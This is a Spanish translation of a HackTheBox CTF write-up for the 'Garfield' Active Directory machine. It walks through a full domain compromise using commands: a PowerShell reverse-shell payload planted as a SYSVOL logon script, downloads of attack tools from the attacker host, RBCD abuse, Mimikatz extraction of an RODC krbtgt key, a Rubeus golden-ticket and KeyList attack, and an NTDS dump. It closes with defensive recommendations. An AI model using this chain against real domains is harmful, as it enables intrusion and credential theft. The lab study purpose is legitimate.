# HTB Season 10 – Garfield: Writeup completo traducido al español

> **Fuente original:** CNBlogs – dynasty_chenzi  
> **Título original:** `〖渗透测试〗HTB Season10 Garfield 全过程wp`  
> **URL:** https://www.cnblogs.com/DSchenzi/p/19849166  
> **Uso recomendado:** material de estudio en laboratorio/CTF autorizado.

---

## 1. Información inicial

La máquina corresponde a un entorno de **Active Directory** con un controlador de dominio identificado como `DC01.garfield.htb`. Durante el reconocimiento se observan servicios típicos de un dominio Windows, incluyendo DNS, Kerberos, LDAP, SMB, RDP y WinRM.


---

Primero se agrega el dominio de la máquina al archivo `/etc/hosts`. Esto permite referenciar la IP objetivo usando el nombre `overwatch.htb`.

```bash
echo "<IP> garfield.htb" | sudo tee -a /etc/hosts
```

---

## 2. Recolección de información

Se ejecuta un escaneo agresivo con Nmap:

#### Descubrimiento rápido de puertos TCP

```bash
sudo nmap -p- --open -Pn --min-rate 5000 -oA ports -vvv garfield.htb
```

**Explicación:**

- `-p-`: escanea todos los puertos TCP.
- `--open`: muestra solo puertos abiertos.
- `-Pn`: evita descubrimiento por ping.
- `--min-rate 5000`: acelera el escaneo enviando paquetes a una tasa mínima.
- `-oA ports`: guarda resultados en varios formatos con nombre base `ports`.
- `-vvv`: aumenta el nivel de detalle en pantalla.

#### Detección de versiones y scripts básicos

```bash
grep -oP '\d+/open' ports.gnmap | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//' > ports.txt
```
```bash
sudo nmap -sCV -p$(cat ports.txt) -Pn -oA scan -vvv garfield.htb
```

Resultado relevante:

```text
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
88/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
389/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
464/tcp  open  tcpwrapped
593/tcp  open  tcpwrapped
636/tcp  open  tcpwrapped
2179/tcp open  tcpwrapped
3268/tcp open  tcpwrapped
3269/tcp open  tcpwrapped
3389/tcp open  tcpwrapped
5985/tcp open  tcpwrapped
```

Información identificada:

- Sistema altamente probable: **Windows Server 2019 / Windows 10**, versión `10.0.17763`.
- Controlador de dominio: `DC01.garfield.htb`.
- Dominio DNS: `garfield.htb`.
- Nombre NetBIOS del dominio: `GARFIELD`.
- El puerto `5985` indica posible administración remota mediante **WinRM**.
- El servicio SMB tiene la firma habilitada y requerida, por lo que un ataque clásico de SMB Relay sería más difícil.
- La información de RDP/NTLM revela nombre del equipo, dominio y versión del sistema.
- Existe una diferencia aproximada de 8 horas entre el reloj local y el sistema objetivo.

Servicios importantes:

| Puerto | Servicio | Descripción |
|---:|---|---|
| 53 | DNS | Resolución de nombres del dominio |
| 88 | Kerberos | Autenticación Kerberos |
| 135 / 139 / 445 | RPC / SMB | Comunicación Windows y compartidos |
| 389 / 636 | LDAP / LDAPS | Directorio activo |
| 464 | Kerberos password change | Cambio de contraseña Kerberos |
| 3268 / 3269 | Global Catalog | Servicios de Active Directory |
| 3389 | RDP | Escritorio remoto |
| 5985 | WinRM | Administración remota por HTTP |

Conclusión inicial: el objetivo es un **controlador de dominio Active Directory**.

---

## 3. Enumeración SMB con credenciales

Con credenciales del usuario `j.arbuckle`, se enumeran recursos compartidos y usuarios mediante NetExec:

```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
```
```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

Durante la enumeración se identifican usuarios como:

- `l.wilson`
- `l.wilson_adm`

---

## 4. Enumeración de objetos modificables en Active Directory

Se utiliza `bloodyAD` para listar objetos del dominio sobre los cuales el usuario actual tiene permisos de escritura o modificación:

```bash
bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
```

Hallazgos:

- El usuario `j.arbuckle` tiene permisos modificables sobre `l.wilson` y `l.wilson_adm`.
- Esto sugiere la posibilidad de alterar propiedades de esos usuarios.
- También se observa capacidad de crear subobjetos en zonas DNS como `garfield.htb` y `_msdcs.garfield.htb`.

Esto puede estar relacionado con abuso de **ADIDNS/WPAD hijacking**, una técnica clásica de abuso de registros DNS dentro de Active Directory.

---

## 5. Intento de cambio de contraseña

Se intenta modificar la contraseña de `l.wilson`:

```bash
bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set password l.wilson 'NewPass@123!'
```

El intento no funciona porque el usuario `j.arbuckle` tiene permiso genérico de escritura sobre el objeto, pero no cuenta con el permiso específico para cambiar o resetear la contraseña.

Conclusión: esta vía no permite tomar control directamente mediante cambio de contraseña.

---

## 6. Revisión de SYSVOL

El usuario actual tiene permisos de lectura sobre `SYSVOL`. Se accede al recurso compartido:

```bash
smbclient //<IP>/SYSVOL -U 'j.arbuckle'
```

Dentro de `smbclient`:

```text
cd garfield.htb\scripts
ls
```

La ruta `scripts` corresponde al directorio típico donde pueden almacenarse scripts de inicio de sesión del dominio.

Idea de explotación: escribir un script en el directorio de scripts de inicio de sesión y modificar el atributo `scriptPath` de un usuario para que ejecute dicho script al iniciar sesión.

---

## 7. Explotación inicial

### 7.1 Generar payload PowerShell

En Linux se genera un payload de reverse shell en PowerShell codificado en Base64 UTF-16LE (<BASE64_PAYLOAD>):

```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<port>);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2>&1|Out-String);
$sendback2=$sendback+"PS "+(pwd).Path+"> ";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0
```

> Nota: reemplazar la IP y el puerto por los valores correspondientes del laboratorio.

### 7.2 Crear archivo BAT

Se crea un archivo `printerDetect.bat` que ejecuta el payload:

```bash
cat > printerDetect.bat << 'BAT'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>
BAT
```

### 7.3 Subir el BAT a SYSVOL

```bash
smbclient //<IP>/SYSVOL -U 'j.arbuckle'
```

Dentro de `smbclient`:

```text
cd garfield.htb\scripts
put printerDetect.bat printerDetect.bat
dir
exit
```

### 7.4 Escuchar desde Linux

Se configura la escucha:

```bash
nc -lvnp 4444
```

### 7.5 Modificar `scriptPath` del usuario Liz Wilson

Se configura el atributo `scriptPath` para que el usuario `Liz Wilson` ejecute `printerDetect.bat` al iniciar sesión:

```bash
bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
scriptPath -v printerDetect.bat
```

Cuando se activa la ejecución del script, se obtiene una shell como `l.wilson`.

---

## 8. Movimiento lateral: de `l.wilson` a `l.wilson_adm`

Una vez obtenida shell como `l.wilson`, se busca escalar hacia `l.wilson_adm`.

Desde PowerShell se resetea la contraseña del usuario administrador relacionado:

```powershell
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
```

Se valida el acceso por WinRM:

```bash
nxc winrm garfield.htb -u 'l.wilson_adm' -p 'WhoKnows123!'
```

Si la validación es correcta, se obtiene shell interactiva:

```bash
evil-winrm -i garfield.htb -u l.wilson_adm -p 'WhoKnows123!'
```
<img width="731" height="313" alt="Screenshot 2026-06-28 at 08 26 32" src="https://github.com/user-attachments/assets/d82f2da5-7a2b-4601-a0d5-cea04cbbc559" />

---

## 9. Escalada de privilegios

### 9.1 Nueva enumeración

Se identifica la existencia de un RODC:

```text
RODC01.garfield.htb
```

Información de red:

```text
RODC01.garfield.htb -> 192.168.100.2
DC01.garfield.htb   -> 192.168.100.1
```

También se observa que el usuario cuenta con `SeMachineAccountPrivilege` y pertenece al grupo:

```text
GARFIELD\Tier 1
```

Este grupo está relacionado con administración de servidores o RODC dentro del dominio.

---

## 10. Agregar usuario a RODC Administrators

Se agrega `l.wilson_adm` al grupo `RODC Administrators`:

```powershell
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

Interpretación:

- Los administradores Tier 1 tienen capacidad de administración sobre RODC.
- Al pertenecer a este grupo, se pueden modificar políticas de replicación de contraseñas del RODC.
- Esto permite preparar el camino para cachear credenciales privilegiadas.

---

## 11. Port forwarding y túnel con Ligolo-ng

### 11.1 Preparar Ligolo-ng en Kali

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

### 11.2 Transferir y ejecutar el agente en Windows

En Kali se levanta un servidor HTTP:

```bash
python3 -m http.server 80
```

En la sesión WinRM:

```powershell
Invoke-WebRequest -Uri "http://10.10.16.9:80/agent.exe" -OutFile "agent.exe"
.\agent.exe -connect 10.10.16.9:11601 -ignore-cert
```

### 11.3 Configurar rutas en Kali

```bash
sudo ip addr add 10.10.16.9/23 dev ligolo
sudo ip route add 192.168.100.0/24 dev tun1
```

En la consola de Ligolo:

```text
ligolo-ng > session
ligolo-ng > session 1
ligolo-ng > start
```

Con esto queda activo el túnel hacia la red interna donde se encuentra `RODC01`.

---

## 12. Validar acceso a RODC01

```bash
nxc smb 192.168.100.2 -u l.wilson_adm -p 'WhoKnows123!'
```

---

## 13. Crear una cuenta de máquina controlada

Como el usuario tiene `SeMachineAccountPrivilege`, se crea una cuenta de equipo falsa en el dominio:

```bash
impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
-computer-name 'FAKE$' \
-computer-pass 'FakePass123!' \
-dc-ip 10.129.196.71
```

Validación:

```bash
nxc ldap 10.129.196.71 -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
```

---

## 14. Configurar RBCD sobre RODC01

Se configura Resource-Based Constrained Delegation para permitir que `FAKE$` delegue contra `RODC01`.

Desde WinRM:

```powershell
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount
```

Si el atributo queda configurado correctamente, se puede solicitar un ticket de servicio impersonando a `Administrator`.

---

## 15. Impersonar al administrador de RODC01

Antes de solicitar tickets Kerberos, se sincroniza la hora:

```bash
ntpdate 10.129.196.71
```

Solicitud de ticket de servicio:

```bash
impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
-spn cifs/RODC01.garfield.htb \
-impersonate Administrator \
-dc-ip 10.129.196.71
```

Exportar el ticket:

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
echo $KRB5CCNAME
```

Obtener shell como SYSTEM en RODC01:

```bash
impacket-psexec -k -no-pass \
-dc-ip 10.129.196.71 \
-target-ip 192.168.100.2 \
garfield.htb/Administrator@RODC01.garfield.htb
```

---

## 16. Extraer clave AES256 del usuario `krbtgt_8245`

El objetivo es extraer la clave del usuario `krbtgt_8245` para preparar ataques Kerberos posteriores, como Golden Ticket o KeyList.

### 16.1 Servir Mimikatz desde Kali

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
cd /tmp
python3 -m http.server 8888
```

### 16.2 Descargar Mimikatz en RODC01

```cmd
cd C:\Windows\Temp
certutil -urlcache -split -f http://10.10.16.9:80/mimikatz.exe mimikatz.exe
mimikatz.exe
```

### 16.3 Comandos dentro de Mimikatz

```text
privilege::debug
lsadump::lsa /inject /name:krbtgt_8245
```

Resultado relevante:

```text
AES256: d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
SID: S-1-5-21-2502726253-3859040611-225969357
Número RODC: 8245
```

---

## 17. Modificar la Password Replication Policy del RODC

Se carga PowerView desde Kali:

```bash
cd /usr/share/windows-resources/powersploit/Recon/
python3 -m http.server 8888
```

En WinRM:

```powershell
cd C:\Users\l.wilson_adm\Desktop
certutil -urlcache -split -f http://10.10.16.9:80/PowerView.ps1 PowerView.ps1
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-Command *DomainObject*
```

Modificar propiedades del RODC:

```powershell
Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'

Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
```

Descripción de atributos:

| Atributo | Función | Objetivo |
|---|---|---|
| `msDS-RevealOnDemandGroup` | Define usuarios o grupos cuyas credenciales pueden ser cacheadas por el RODC | Agregar `Administrator` a la lista permitida |
| `msDS-NeverRevealGroup` | Define usuarios o grupos cuyas credenciales nunca deben cachearse | Limpiar esta restricción para permitir cacheo |
| `Get-ADComputer` | Consulta propiedades del equipo | Verificar que la modificación fue exitosa |

---

## 18. Golden Ticket + KeyList Attack

Rubeus es una herramienta de Kerberos para Windows escrita en C#. Permite, entre otras funciones:

- Crear Golden Tickets y Silver Tickets.
- Capturar tickets.
- Pass-the-Ticket.
- Pass-the-Key.
- AS-REP Roasting.
- Kerberoasting.
- Manipulación de cachés de tickets.

### 18.1 Transferir Rubeus

En Kali:

```bash
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
cd /tmp
python3 -m http.server 8888
```

En WinRM:

```powershell
certutil -urlcache -split -f http://10.10.16.9:80/Rubeus.exe Rubeus.exe
dir Rubeus.exe
.\Rubeus.exe
```

### 18.2 Crear TGT con Rubeus

```powershell
.\Rubeus.exe golden `
/rodcNumber:8245 `
/flags:forwardable,renewable,enc_pa_rep `
/nowrap `
/outfile:ticket.kirbi `
/aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
/user:Administrator `
/id:500 `
/domain:garfield.htb `
/sid:S-1-5-21-2502726253-3859040611-225969357
```

### 18.3 Ejecutar KeyList Attack

```powershell
.\Rubeus.exe asktgs `
/enctype:aes256 `
/keyList `
/service:krbtgt/garfield.htb `
/dc:DC01.garfield.htb `
/ticket:ticket_2026_04_10_22_51_40_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
/nowrap
```

El resultado entrega una cadena Base64 correspondiente al ticket. En el artículo original se muestra la cadena completa; aquí se omite por extensión y porque puede copiarse directamente de la fuente si se requiere para el laboratorio.

Guardar la salida Base64 en Kali:

```bash
sed -i 's/^[[:space:]]*//' ticket.b64
tr -d '\r\n\t ' < ticket.b64 | base64 -d > ticket.kirbi
```

Convertir `.kirbi` a `.ccache`:

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

Exportar ticket:

```bash
export KRB5CCNAME=ticket.ccache
echo $KRB5CCNAME
```

---

## 19. Dump de NTDS y acceso final

Con el ticket válido, se realiza dump de NTDS desde el DC:

```bash
nxc smb DC01.garfield.htb --use-kcache --ntds
```

Finalmente, se obtiene acceso como administrador:

```bash
evil-winrm -i 10.129.196.71 -u Administrator -H 'ee238f6debc752010428f20875b092d5'
```

---

## 20. Resumen de la cadena de ataque

1. Enumeración inicial con Nmap.
2. Confirmación de entorno Active Directory.
3. Enumeración SMB y usuarios con credenciales válidas.
4. Identificación de permisos de escritura sobre objetos del dominio.
5. Intento fallido de reset de contraseña por falta de permiso específico.
6. Abuso de `SYSVOL` y `scriptPath` para ejecutar un script de inicio de sesión.
7. Obtención de shell como `l.wilson`.
8. Movimiento lateral a `l.wilson_adm` mediante reset de contraseña.
9. Identificación de RODC y privilegios Tier 1.
10. Incorporación al grupo `RODC Administrators`.
11. Túnel hacia red interna con Ligolo-ng.
12. Creación de cuenta de máquina controlada `FAKE$`.
13. Configuración de RBCD sobre `RODC01`.
14. Impersonación de `Administrator` contra RODC01.
15. Extracción de clave AES256 del usuario `krbtgt_8245`.
16. Modificación de la Password Replication Policy del RODC.
17. Golden Ticket y KeyList Attack con Rubeus.
18. Conversión de tickets y uso con Impacket.
19. Dump de NTDS.
20. Acceso final como `Administrator`.

---

## 21. Conceptos clave para estudiar

- Enumeración de Active Directory.
- SYSVOL y scripts de inicio de sesión.
- Atributo `scriptPath`.
- Permisos de escritura sobre objetos AD.
- Movimiento lateral con WinRM.
- `SeMachineAccountPrivilege`.
- RODC y Password Replication Policy.
- Resource-Based Constrained Delegation, RBCD.
- Kerberos tickets: TGT, TGS, `.kirbi`, `.ccache`.
- Golden Ticket.
- KeyList Attack.
- Dump de NTDS.

---

## 22. Recomendaciones defensivas

Para un entorno real, los aprendizajes defensivos más importantes son:

- Revisar permisos excesivos sobre objetos de Active Directory.
- Auditar usuarios con capacidad de modificar atributos como `scriptPath`.
- Monitorear cambios en `SYSVOL`, especialmente en carpetas de scripts.
- Controlar estrictamente usuarios con `SeMachineAccountPrivilege`.
- Auditar creación de cuentas de máquina anómalas.
- Monitorear cambios en atributos relacionados con delegación.
- Revisar membresías de grupos como `RODC Administrators` y grupos Tier.
- Alertar modificaciones a `msDS-RevealOnDemandGroup` y `msDS-NeverRevealGroup`.
- Monitorear ejecución de herramientas como Mimikatz, Rubeus, PowerView e Impacket.
- Implementar protección de credenciales, logging avanzado y detección basada en comportamiento.
